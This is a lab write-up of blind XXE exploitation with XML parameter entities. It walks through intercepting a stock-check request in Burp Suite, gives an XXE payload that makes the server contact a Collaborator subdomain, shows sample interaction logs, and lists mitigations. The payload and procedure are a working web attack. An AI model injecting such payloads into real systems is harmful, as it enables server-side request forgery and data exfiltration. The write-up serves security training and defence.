
# 1. Blind XXE with Out-of-Band Interaction via XML Parameter Entities

## 2. CVSS Score

**CVSS v3.1 Base Score: 9.1 (Critical)**
**CWE-611: Improper Restriction of XML External Entity Reference (‘XXE’)**

## 3. OWASP Top 10 Reference

* **A05:2021 – Security Misconfiguration**
* **A10:2021 – Server-Side Request Forgery (SSRF)**

---

## 4. Description of Vulnerability

This lab demonstrates a **blind XML External Entity (XXE)** vulnerability using **XML parameter entities** to exploit out-of-band (OAST) interaction channels. The application processes user-supplied XML and makes DNS or HTTP requests to a malicious server without directly reflecting the result in the response.

An attacker can insert a malicious parameter entity that triggers the application to request an attacker-controlled server (Burp Collaborator, in this case), allowing the attacker to infer if the XXE vulnerability exists by observing out-of-band interactions.

---

## 5. Detailed Explanation of What We Performed

In this scenario, we used **Burp Suite Professional** and its **Collaborator** feature to detect server-side interactions initiated by a malicious **XML parameter entity**. By embedding a payload with a collaborator subdomain, we were able to observe interactions that confirmed the XXE vulnerability, despite no direct data being returned by the server.

---

## 6. Step-by-Step Procedure

🔹 **Step 1: Visit the Target and Intercept the Request**

1. Navigate to a product page on the lab website.
2. Click **"Check stock"** to trigger the POST request.
3. Intercept the resulting **POST** request using **Burp Suite Proxy**.

🔹 **Step 2: Generate a Burp Collaborator Payload**

4. Go to the **Collaborator** tab in **Burp Suite**.
5. Click **"Copy to clipboard"** to generate a unique **Burp Collaborator subdomain**.

🔹 **Step 3: Inject the Malicious External Entity**

6. Modify the intercepted request to include the malicious XML payload. Insert the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
  <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-ID.burpcollaborator.net">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
  <storeId>1</storeId>
</stockCheck>
```

7. Replace `YOUR-COLLABORATOR-ID.burpcollaborator.net` with your actual **Burp Collaborator** subdomain.

🔹 **Step 4: Forward the Request and Monitor Collaborator**

8. Forward the modified request to the server using **Burp Suite**.
9. Return to the **Collaborator** tab and click **"Poll now"** to observe any incoming interactions.

🔹 **Step 5: Confirm Out-of-Band Interaction**

10. After a few seconds, the **Collaborator tab** should show **DNS** and/or **HTTP** interactions initiated by the server. This confirms the XXE vulnerability.

---

## 7. Impact of the Vulnerability

* **Out-of-Band Data Exfiltration**: Even though no direct data is returned, attackers can still exfiltrate data by triggering DNS or HTTP requests to an external server.
* **Internal System Interaction**: Through SSRF and XXE, attackers may probe and interact with internal resources.
* **Reconnaissance**: The attacker gains useful insights into the server's ability to resolve external entities, potentially aiding in more sophisticated attacks.

---

## 8. Recommendations and Mitigations

* **Disable DTD Processing**: Configure the XML parser to reject any `DOCTYPE` declarations or external entities entirely.
* **Use Secure XML Parsers**: Leverage XML parsers with secure defaults that disable XXE by default (e.g., **defusedxml** in Python).
* **Prevent Outbound Requests**: Configure server-side applications to block or restrict external HTTP/DNS requests.
* **Monitor DNS Traffic**: Keep an eye on DNS requests from the server that may indicate the exploitation of XXE vulnerabilities.

---

## 9. References

* [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
* [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe/blind)

---

## 10. Proof of Concept

### Payload Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
  <!ENTITY % xxe SYSTEM "http://abc123xyz.burpcollaborator.net">
  %xxe;
]>
<stockCheck>
  <productId>123</productId>
  <storeId>1</storeId>
</stockCheck>
```

### Collaborator Log Output:

```
[DNS] abc123xyz.burpcollaborator.net -> <source-ip>
[HTTP] GET / HTTP/1.1
Host: abc123xyz.burpcollaborator.net
User-Agent: Java/1.8.0
...
